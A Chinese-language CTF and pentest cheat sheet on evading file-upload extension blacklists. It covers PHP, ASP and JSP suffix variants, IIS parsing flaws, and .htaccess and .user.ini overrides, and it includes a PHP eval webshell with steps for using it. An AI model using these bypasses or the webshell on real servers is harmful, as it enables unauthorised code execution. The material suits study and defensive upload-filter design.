>核心思维：见到黑名单先做什么
```
拿到黑名单，按顺序检查：

Step 1：对照本篇，找出黑名单里漏掉的同语言可执行后缀
Step 2：检查大小写是否统一处理
Step 3：检查有没有 .htaccess / .user.ini
Step 4：结合服务器类型，找对应的特殊绕过后缀
```

# 1 PHP 全部可执行后缀
> PHP 是 CTF 和真实渗透中最常见的语言，后缀变体最多

## 1.1 标准后缀
```
.php            ← 最常见，黑名单必有
.php3           PHP 3.x 时代的后缀，很多黑名单遗漏
.php4           PHP 4.x 时代的后缀，很多黑名单遗漏
.php5           PHP 5.x 时代的后缀，较多黑名单遗漏
.php7           PHP 7.x 时代的后缀，新黑名单可能遗漏
.php8           PHP 8.x 时代的后缀，大多数黑名单遗漏
.phtml          PHP + HTML 混合模板，大量黑名单遗漏   ← 重点
.pht            较少见，很多黑名单遗漏               ← 重点
.phar           PHP 归档格式，能包含并执行 PHP 代码   ← 重点
```

## 1.2 大小写变体
```
前提：黑名单没有做 strtolower() 统一转小写

.PHP    .Php    .PHp    .phP
.PHP3   .PHP4   .PHP5   .PHP7
.Phtml  .PHTML  .pHtml
.Phar   .PHAR

示例：
$blacklist = ['php', 'php3', 'phtml'];
// 没有 strtolower → shell.PHP 直接绕过
```

## 1.3 各 PHP 后缀的服务器支持情况
```
Apache（需要对应配置或模块）：
  .php    ✅ 默认支持
  .php3   ✅ 老版本默认支持，新版需配置
  .php4   ✅ 老版本默认支持，新版需配置
  .php5   ✅ 老版本默认支持，新版需配置
  .php7   ⚠️  需要显式配置
  .phtml  ✅ 通常支持
  .pht    ⚠️  需要配置
  .phar   ✅ PHP 本身支持

Nginx + PHP-FPM：
  由 nginx.conf 中的 location ~ \.php$ 决定
  只有匹配正则的后缀才会被转发给 PHP-FPM
  默认只匹配 .php
  其他后缀（php3/phtml等）需要修改正则才能执行

IIS：
  .php    需要安装 PHP 模块
  其他变体后缀支持较差
```

## 1.4 Apache支持众多PHP后缀原因
```
Apache 的 PHP 解析通过以下配置实现：

/etc/apache2/mods-enabled/php7.4.conf（示例）：

<FilesMatch ".+\.ph(ar|p|tml)$">
    SetHandler application/x-httpd-php
</FilesMatch>

这个正则匹配了：
  .phar  ← ph(ar)
  .php   ← ph(p)
  .phtml ← ph(tml)

某些老版本或特殊配置：
AddType application/x-httpd-php .php .php3 .php4 .php5 .phtml .pht
→ 列出了所有允许的后缀
→ 这一行里有几个，服务器就支持几个
```
# 2 ASP / ASPX 全部可执行后缀
> IIS 服务器（Windows 环境）常见

```
.asp            经典 ASP，IIS 默认支持
.aspx           ASP.NET，IIS 默认支持
.asa            ASP 应用程序文件，较少见
.asax           ASP.NET 全局应用程序文件
.ascx           ASP.NET 用户控件
.ashx           ASP.NET HTTP 处理程序          ← 很多黑名单遗漏
.asmx           ASP.NET Web 服务               ← 很多黑名单遗漏
.axd            ASP.NET 内置处理程序
.cer            IIS 特有，某些版本可当 ASP 执行 ← 经典绕过
.cdx            IIS 特有，某些版本可执行
.shtml          服务端包含（SSI），IIS 支持
.stm            服务端包含（SSI），IIS 支持

大小写变体（IIS 对后缀大小写不敏感）：
.ASP .ASPX .Asp .AspX
```

## IIS 版本与后缀支持
```
IIS 6.0（Windows Server 2003）：
  经典漏洞：shell.asp;.jpg  ← 分号截断，被当作 .asp 执行
  经典漏洞：/upload/shell.jpg/x.asp ← 路径解析漏洞

IIS 7.0 / 7.5（Windows Server 2008）：
  经典漏洞：shell.jpg/.php ← 同 Nginx 解析漏洞
  需要开启 cgi.fix_pathinfo=1

黑名单中常见遗漏：
  .ashx .asmx .cer .asa .asax
```
# 3 JSP 全部可执行后缀
> Java Web 环境（Tomcat / JBoss / WebLogic / WebSphere）

```
.jsp            JavaServer Pages，最常见
.jspx           JSP XML 语法版本              ← 很多黑名单遗漏
.jsw            WebSphere 特有
.jsv            较少见
.jspf           JSP 片段文件                  ← 较多黑名单遗漏

大小写变体（部分容器大小写不敏感）：
.JSP .JSPX .Jsp .JspX

Tomcat 特有：
  .jhtml          某些 Tomcat 版本支持
  
黑名单常见遗漏：
  .jspx .jspf
```
# 4 其他服务端脚本后缀

## 4.1 Python
```
Web 框架常见执行方式：
  .py             Python 脚本（CGI 模式下可直接执行）
  .wsgi           WSGI 应用
  
CGI 模式下（Apache 开启 CGI）：
  .py 可以被直接执行，需要文件有执行权限且有正确的 shebang
  #!/usr/bin/env python3
```

## 4.2 Perl
```
.pl             Perl 脚本（CGI 模式）
.cgi            CGI 脚本（通用，可以是任意语言）

```

## 4.3 Ruby
```
.rb             Ruby 脚本（CGI/Rack 模式）
.rhtml          Ruby 嵌入 HTML（ERB 模板）
```

## 4.4 Shell 脚本
```
.sh             Bash/Shell 脚本（CGI 模式）
.bash           Bash 脚本
.csh            C Shell 脚本
.ksh            Korn Shell 脚本
```

## 4.5 CGI 通用
```
.cgi            通用 CGI 脚本（内容可以是任意语言）

                就能被执行
```

# 5 能影响目录解析规则的特殊文件
> 这类文件本身不是脚本，但上传后能**改变服务器行为**
> 使得原本不能执行的文件变得可以执行

### 5.1 .htaccess（Apache）
```
文件名：.htaccess
作用：覆盖 Apache 对当前目录的配置

上传此文件后，可以：

① 让任意后缀被当作 PHP 执行：
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .txt
AddType application/x-httpd-php .png
→ 之后上传 shell.jpg，访问时被当作 PHP 执行

② 让特定文件名被当作 PHP 执行：
<Files "shell.jpg">
    SetHandler application/x-httpd-php
</Files>

③ 修改默认索引文件（信息泄露用）：
DirectoryIndex shell.php

生效条件：
  ✅ Apache 服务器
  ✅ 配置中有 AllowOverride All 或 AllowOverride FileInfo
  ✅ 上传目录和 .htaccess 在同一目录

黑名单检查：
  很多黑名单只过滤了脚本后缀（php/asp等）
  忘记过滤 .htaccess 这种无后缀（或后缀就是完整文件名）的文件
```

## 5.2 .user.ini（Nginx/PHP-FPM）
```
文件名：.user.ini
作用：PHP-FPM 模式下，覆盖当前目录的 PHP 配置

最常用的攻击写法：
auto_prepend_file=shell.jpg
→ 效果：访问当前目录下任意 PHP 文件时
        自动在其前面执行 shell.jpg 的内容
        相当于把 shell.jpg 当作 PHP 代码执行

使用步骤：
  Step 1：上传 .user.ini，内容为 auto_prepend_file=shell.jpg
  Step 2：上传 shell.jpg，内容为 <?php @eval($_POST['cmd']); ?>
  Step 3：访问当前目录下任意一个正常的 .php 文件
  Step 4：shell.jpg 的内容被自动 include，PHP 代码被执行

其他可用配置：
auto_append_file=shell.jpg   ← 自动在 PHP 文件末尾执行
extension=xxxxx              ← 加载额外的 PHP 扩展

生效条件：
  ✅ PHP 以 FPM 模式运行（Nginx + PHP-FPM 标配）
  ✅ 当前目录下有可访问的 .php 文件
  ⚠️  生效有缓存延迟，默认 300 秒（5分钟）后生效
      可通过 user_ini.cache_ttl 配置修改

黑名单检查：
  绝大多数黑名单都遗漏了 .user.ini
  因为它不是脚本文件，只是配置文件
```

## 5.3 对比总结
```
┌─────────────┬────────────┬──────────────────────────────┐
│ 文件         │ 适用服务器  │ 核心作用                      │
├─────────────┼────────────┼──────────────────────────────┤
│ .htaccess   │ Apache     │ 修改目录的解析规则             │
│ .user.ini   │ PHP-FPM    │ 修改目录的 PHP 配置            │
│             │ (Nginx等)  │ auto_prepend_file 自动包含    │
└─────────────┴────────────┴──────────────────────────────┘
```

# 7 见到黑名单的完整分析流程
```
拿到黑名单代码，例如：
$blacklist = ['php', 'asp', 'aspx', 'jsp', 'php3', 'php5'];

─────────────────────────────────────────────────────────

检查1：有没有 strtolower？
  → 没有 → 直接试 .PHP .Php .pHp

─────────────────────────────────────────────────────────

检查2：PHP 变体后缀对照
  黑名单有：php php3 php5
  黑名单没有：php4 ✅ php7 ✅ php8 ✅ phtml ✅ pht ✅ phar ✅
  → 优先试 phtml phar php7

─────────────────────────────────────────────────────────

检查3：配置文件后缀
  黑名单有：php asp aspx jsp php3 php5
  黑名单没有：.htaccess ✅ .user.ini ✅
  → 根据服务器类型选择：
    Apache  → 上传 .htaccess
    Nginx   → 上传 .user.ini

─────────────────────────────────────────────────────────

检查4：ASP 变体（IIS 环境）
  黑名单有：asp aspx
  黑名单没有：asa ✅ cer ✅ ashx ✅ asmx ✅
  → 优先试 cer ashx

─────────────────────────────────────────────────────────

检查5：JSP 变体（Java 环境）
  黑名单有：jsp
  黑名单没有：jspx ✅ jspf ✅
  → 优先试 jspx

─────────────────────────────────────────────────────────

优先级建议：
  1. 大小写绕过（最简单，先试）
  2. phtml / phar（PHP 环境最稳）
  3. .htaccess / .user.ini（需要额外步骤但很有效）
  4. php7 / php8 等版本后缀
  5. cer / ashx（IIS 环境）
  6. jspx（Java 环境）
```

# 8 快速记忆口诀

```
PHP 后缀别只记 php：
  三四五七八，phtml pht phar
  （php3 php4 php5 php7 php8，phtml pht phar）

配置文件两兄弟：
  Apache 用 htaccess
  FPM 用 user.ini

ASP 家族：
  asp aspx 是主力
  asa cer ashx asmx 是漏网之鱼

JSP 家族：
  jsp 之外还有 jspx jspf
```

> 💡 **核心记忆点**
> - **黑名单永远不完整**，这是黑名单策略的根本缺陷
> - **PHP** 的变体最多，`phtml` `phar` `php7/8` 是最常被遗漏的
> - **`.htaccess`** 和 **`.user.ini`** 不是脚本后缀，所以最容易被黑名单遗漏
> - 见到黑名单，**先检查大小写，再找变体后缀，再找配置文件**
> - 白名单策略才是根本解决方案，黑名单只是安全感
